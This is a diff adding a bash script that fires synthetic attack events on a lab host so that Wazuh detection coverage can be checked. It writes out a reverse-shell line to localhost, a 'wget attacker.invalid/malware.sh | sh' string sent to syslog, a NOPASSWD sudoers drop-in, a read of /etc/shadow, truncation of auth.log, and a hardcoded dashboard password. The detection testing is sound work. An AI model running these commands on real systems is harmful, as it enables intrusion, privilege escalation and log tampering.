@@ -1,0 +1,370 @@
+#!/usr/bin/env bash
+#
+# bw-trigger — Fire synthetic security events on black-host-01 to verify
+# Wazuh detection coverage in the test environment.
+#
+# Usage:   tests/triggers/bw-trigger <event> [event ...]
+#          tests/triggers/bw-trigger all      # run every event
+#          tests/triggers/bw-trigger clean    # undo persistent side effects
+#          tests/triggers/bw-trigger list     # list available events
+#
+# Each event prints what it's doing, executes the trigger over SSH on
+# black-host-01, and points you at the dashboard. After running, open:
+#
+#   https://localhost:5601/app/wz-home   (Wazuh app → Security Events)
+#   https://localhost:5601/app/discover  (index: wazuh-alerts-*)
+#
+# Filter by agent.name:black-host-01 to scope to triggered events.
+
+set -uo pipefail
+
+ANSIBLE_DIR="$(cd "$(dirname "$0")/../../blackwall-eye" && pwd)"
+TARGET="black-host-01"
+TEST_USER="bw-trigger-user"
+TEST_PASS_OLD="initialPass123!"
+TEST_PASS_NEW="rotatedPass456!"
+SUDOERS_DROPIN="/etc/sudoers.d/bw-trigger"
+CRON_DROPIN="/etc/cron.d/bw-trigger"
+SETUID_FILE="/tmp/bw-trigger-setuid"
+WEBSHELL_FILE="/tmp/.bw-trigger.sh"
+AUDIT_FILE="/tmp/bw-trigger-audit"
+DAEMON_PIDFILE="/tmp/bw-trigger-daemon.pid"
+NC_LISTENER_PORT="4444"
+FAKE_SSH_KEY="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIbwTriggerSyntheticKeyDoNotUseInProd bw-trigger@synthetic"
+
+color()   { printf '\033[%sm%s\033[0m\n' "$1" "$2"; }
+header()  { color "1;36" "▶ $*"; }
+info()    { color "0;37" "  $*"; }
+done_()   { color "0;32" "  ✓ $*"; }
+warn()    { color "0;33" "  ⚠ $*"; }
+
+remote() {
+  # Run a shell snippet on black-host-01 as root via ansible.
+  # Uses the blackwall-eye/ansible.cfg + tests/inventory/hosts.yml.
+  ( cd "$ANSIBLE_DIR" && ansible "$TARGET" -m shell -a "$*" --become )
+}
+
+remote_silent() {
+  ( cd "$ANSIBLE_DIR" && ansible "$TARGET" -m shell -a "$*" --become ) >/dev/null 2>&1
+}
+
+require_ssh() {
+  if ! command -v ansible >/dev/null 2>&1; then
+    color "1;31" "ansible not on PATH. Install Ansible (e.g. pipx install ansible)."
+    exit 1
+  fi
+  if ! remote_silent 'true'; then
+    color "1;31" "Cannot reach $TARGET via ansible. Bring the test environment up first:"
+    color "1;31" "  docker compose -f tests/docker/docker-compose.yml --profile ubuntu2204 up -d --build"
+    color "1;31" "Then provision: cd blackwall-eye && ansible-playbook ansible/playbooks/all.yml"
+    exit 1
+  fi
+}
+
+###################################################################
+# Events
+###################################################################
+
+event_user() {
+  header "user: create + delete a local user"
+  info "useradd $TEST_USER ; userdel $TEST_USER"
+  remote "useradd -m $TEST_USER 2>/dev/null || true; sleep 3; userdel -r $TEST_USER 2>/dev/null || true"
+  done_ "expected rules: 5902 (new user) → 5904 (user deleted)"
+}
+
+event_passwd-change() {
+  header "passwd-change: set then rotate a user's password"
+  info "useradd $TEST_USER ; chpasswd ; chpasswd"
+  remote "
+    useradd -m $TEST_USER 2>/dev/null || true
+    echo '$TEST_USER:$TEST_PASS_OLD' | chpasswd
+    sleep 2
+    echo '$TEST_USER:$TEST_PASS_NEW' | chpasswd
+    sleep 2
+    userdel -r $TEST_USER 2>/dev/null || true
+  "
+  done_ "expected: 5901 (password changed) + 5902/5904 around it"
+}
+
+event_ssh-key() {
+  header "ssh-key: add then remove a foreign authorized_keys entry"
+  info "append fake key to /root/.ssh/authorized_keys"
+  remote "
+    mkdir -p /root/.ssh && chmod 700 /root/.ssh
+    touch /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys
+    cp /root/.ssh/authorized_keys /root/.ssh/authorized_keys.bw-trigger-backup 2>/dev/null || true
+    echo '$FAKE_SSH_KEY' >> /root/.ssh/authorized_keys
+    sleep 3
+    # Restore previous content (or empty if no backup existed)
+    if [ -f /root/.ssh/authorized_keys.bw-trigger-backup ]; then
+      mv /root/.ssh/authorized_keys.bw-trigger-backup /root/.ssh/authorized_keys
+    else
+      : > /root/.ssh/authorized_keys
+    fi
+  "
+  warn "FIM does NOT monitor /root/.ssh/authorized_keys by default. To see this alert,"
+  warn "add the path to the wazuh-agent role's <syscheck> directories list."
+}
+
+event_sudoers() {
+  header "sudoers: add then remove a /etc/sudoers.d/ dropin"
+  info "write $SUDOERS_DROPIN, sleep, remove"
+  remote "
+    echo '$TEST_USER ALL=(ALL) NOPASSWD: ALL' > $SUDOERS_DROPIN
+    chmod 0440 $SUDOERS_DROPIN
+    sleep 3
+    rm -f $SUDOERS_DROPIN
+  "
+  warn "default FIM monitors /etc/sudoers; /etc/sudoers.d/ is NOT monitored by default."
+  warn "Add /etc/sudoers.d to the agent role's <syscheck> directories for full coverage."
+}
+
+event_passwd() {
+  header "passwd: touch /etc/passwd to trigger FIM realtime"
+  info "touch /etc/passwd (mtime change only)"
+  remote "touch /etc/passwd"
+  done_ "expected FIM alert on /etc/passwd"
+}
+
+event_sudo() {
+  header "sudo: invoke sudo as a non-root user reading a sensitive file"
+  info "useradd → sudo cat /etc/shadow → userdel"
+  remote "
+    useradd -m $TEST_USER 2>/dev/null || true
+    echo '$TEST_USER ALL=(ALL) NOPASSWD: ALL' > $SUDOERS_DROPIN && chmod 0440 $SUDOERS_DROPIN
+    su -s /bin/bash $TEST_USER -c 'sudo cat /etc/shadow >/dev/null' || true
+    sleep 2
+    rm -f $SUDOERS_DROPIN
+    userdel -r $TEST_USER 2>/dev/null || true
+  "
+  done_ "expected rule 5402 (sudo executed)"
+}
+
+event_ssh-fail() {
+  header "ssh-fail: 4 failed ssh attempts from inside the container"
+  info "ssh wrong-user@127.0.0.1 (will fail auth 4x)"
+  remote "
+    for i in 1 2 3 4; do
+      sshpass -p wrongpass ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 \\
+        -o PreferredAuthentications=password -o PubkeyAuthentication=no \\
+        wronguser@127.0.0.1 true 2>/dev/null || true
+      sleep 1
+    done
+  " || true
+  warn "needs 'sshpass' in container — install if missing"
+  done_ "expected rules: 5503 (failed login) → 5712 (brute force)"
+}
+
+event_daemon() {
+  header "daemon: start a background sleep + nc listener"
+  info "nohup sleep 7200 → PID $DAEMON_PIDFILE ; nc -lk -p $NC_LISTENER_PORT"
+  remote "
+    pkill -f 'sleep 7200 bw-trigger-daemon' 2>/dev/null || true
+    nohup bash -c 'sleep 7200 bw-trigger-daemon' >/dev/null 2>&1 &
+    echo \$! > $DAEMON_PIDFILE
+    # Background nc listener (port 4444). Best-effort.
+    pkill -f 'nc -lk -p $NC_LISTENER_PORT' 2>/dev/null || true
+    nohup nc -lk -p $NC_LISTENER_PORT >/dev/null 2>&1 &
+  "
+  done_ "rootcheck will flag the open port on its next scan (default: 12h)"
+  warn "to force a scan now: ansible black-host-01 -m command -a '/var/ossec/bin/agent_control -R 001' --become"
+}
+
+event_cron() {
+  header "cron: add then remove /etc/cron.d/bw-trigger"
+  info "write $CRON_DROPIN"
+  remote "
+    cat > $CRON_DROPIN <<'EOF'
+* * * * * root /bin/echo bw-trigger > /dev/null
+EOF
+    chmod 644 $CRON_DROPIN
+    sleep 3
+    rm -f $CRON_DROPIN
+  "
+  warn "/etc/cron.d/ FIM coverage depends on role config; default ruleset alerts on syscheck change there"
+  done_ "expected FIM alert"
+}
+
+event_clear-logs() {
+  header "clear-logs: truncate /var/log/auth.log (anti-forensics)"
+  info "truncate -s 0 /var/log/auth.log"
+  remote "
+    # Generate something to truncate first
+    logger -p auth.notice 'bw-trigger pre-clear marker'
+    sleep 2
+    truncate -s 0 /var/log/auth.log
+  "
+  done_ "expected rule 591 (log file emptied) — wazuh sees auth.log size drop"
+}
+
+event_setuid() {
+  header "setuid: chmod u+s on a newly created file"
+  info "touch $SETUID_FILE ; chmod 4755 $SETUID_FILE"
+  remote "
+    touch $SETUID_FILE
+    chmod 4755 $SETUID_FILE
+    sleep 3
+    rm -f $SETUID_FILE
+  "
+  warn "/tmp/ is NOT monitored by FIM by default — this is a no-op unless you extend syscheck dirs"
+}
+
+event_package() {
+  header "package: apt-get install + remove a small package"
+  info "apt-get install -y htop  →  apt-get remove --purge -y htop"
+  remote "
+    DEBIAN_FRONTEND=noninteractive apt-get update -qq >/dev/null 2>&1
+    DEBIAN_FRONTEND=noninteractive apt-get install -y -qq htop >/dev/null 2>&1
+    sleep 2
+    DEBIAN_FRONTEND=noninteractive apt-get remove --purge -y -qq htop >/dev/null 2>&1
+  " || true
+  done_ "expected rule 2902 (new package installed)"
+}
+
+event_web-shell() {
+  header "web-shell: drop a suspicious script in /tmp"
+  info "create $WEBSHELL_FILE with reverse-shell-ish content"
+  remote "
+    cat > $WEBSHELL_FILE <<'EOF'
+#!/bin/sh
+# bw-trigger synthetic web shell — does NOT actually execute or open sockets.
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+EOF
+    chmod +x $WEBSHELL_FILE
+    sleep 3
+    rm -f $WEBSHELL_FILE
+  "
+  warn "default ruleset alone may not flag this; needs vulnerability-detection or rootcheck enabled"
+}
+
+event_process-injection() {
+  header "process-injection: simulate curl-pipe-bash pattern"
+  info "echo 'curl|bash' style command in syslog"
+  remote "
+    logger -p auth.notice 'bw-trigger: curl -s https://example.com/install.sh | bash'
+    sleep 1
+    logger -p auth.notice 'bw-trigger: wget -O - http://attacker.invalid/malware.sh | sh'
+  "
+  done_ "logged to auth — Wazuh decoders may produce custom rule hits depending on ruleset"
+}
+
+event_audit-fim() {
+  header "audit-fim: wget into /tmp + chmod 777"
+  info "writes $AUDIT_FILE, chmod 777, rm"
+  remote "
+    wget -q -O $AUDIT_FILE https://www.google.com 2>/dev/null || echo 'audit content' > $AUDIT_FILE
+    chmod 777 $AUDIT_FILE
+    sleep 3
+    rm -f $AUDIT_FILE
+  "
+  warn "auditd kernel netlink unavailable in Docker — execve events won't fire here.  FIM alerts also won't fire unless /tmp is added to syscheck."
+}
+
+event_firewall() {
+  header "firewall: add then remove an iptables rule"
+  info "iptables -A INPUT -p tcp --dport 31337 -j ACCEPT"
+  remote "
+    iptables -A INPUT -p tcp --dport 31337 -j ACCEPT 2>/dev/null || warn=1
+    sleep 3
+    iptables -D INPUT -p tcp --dport 31337 -j ACCEPT 2>/dev/null || true
+  " || true
+  warn "iptables in unprivileged containers often blocked — alert depends on docker setup"
+}
+
+event_kernel-module() {
+  header "kernel-module: attempt modprobe dummy"
+  info "modprobe dummy (likely blocked in container)"
+  remote "modprobe dummy 2>&1 | head -2 || true"
+  warn "kernel modules cannot be loaded from inside a Docker container — alert will not fire"
+}
+
+###################################################################
+# Clean
+###################################################################
+
+event_clean() {
+  header "clean: undo all persistent side effects"
+  remote "
+    userdel -r $TEST_USER 2>/dev/null || true
+    rm -f $SUDOERS_DROPIN $CRON_DROPIN $SETUID_FILE $WEBSHELL_FILE $AUDIT_FILE
+    pkill -f 'sleep 7200 bw-trigger-daemon' 2>/dev/null || true
+    pkill -f 'nc -lk -p $NC_LISTENER_PORT'  2>/dev/null || true
+    rm -f $DAEMON_PIDFILE
+    if [ -f /root/.ssh/authorized_keys.bw-trigger-backup ]; then
+      mv /root/.ssh/authorized_keys.bw-trigger-backup /root/.ssh/authorized_keys
+    fi
+    iptables -D INPUT -p tcp --dport 31337 -j ACCEPT 2>/dev/null || true
+  "
+  done_ "host state restored"
+}
+
+###################################################################
+# Driver
+###################################################################
+
+ALL_EVENTS=(
+  user passwd-change ssh-key sudoers passwd sudo ssh-fail daemon
+  cron clear-logs setuid package web-shell process-injection
+  audit-fim firewall kernel-module
+)
+
+run_all() {
+  for evt in "${ALL_EVENTS[@]}"; do
+    "event_$evt"
+    sleep 2
+  done
+  echo
+  header "all events fired. Check the dashboard:"
+  echo "  https://localhost:5601/app/wz-home    (Wazuh → Security Events)"
+  echo "  https://localhost:5601/app/discover   (index wazuh-alerts-*)"
+  echo
+  echo "Tail live alerts on the master:"
+  echo "  ansible black-master-00 -m shell -a 'tail -f /var/ossec/logs/alerts/alerts.json | jq -c .rule' --become"
+}
+
+list_events() {
+  echo "Available events (run as: bw-trigger <name>):"
+  for evt in "${ALL_EVENTS[@]}"; do printf "  %s\n" "$evt"; done
+  echo
+  echo "Special:"
+  echo "  all     — run every event in order"
+  echo "  clean   — undo persistent side effects"
+  echo "  list    — show this list"
+}
+
+usage() {
+  sed -n '3,21p' "$0"
+  echo
+  list_events
+}
+
+main() {
+  if [ "$#" -lt 1 ]; then
+    usage
+    exit 2
+  fi
+  # Help/list commands don't need a reachable host.
+  case "$1" in
+    list|-h|--help|help) list_events; return ;;
+  esac
+  require_ssh
+  for arg in "$@"; do
+    case "$arg" in
+      all)    run_all; return ;;
+      clean)  event_clean ;;
+      *)
+        if printf '%s\n' "${ALL_EVENTS[@]}" | grep -qx "$arg"; then
+          "event_$arg"
+        else
+          color "1;31" "Unknown event: $arg"
+          list_events
+          exit 2
+        fi
+        ;;
+    esac
+  done
+  echo
+  echo "Done. Check the dashboard at https://localhost:5601 (admin / Blackwall1!)."
+}
+
+main "$@"
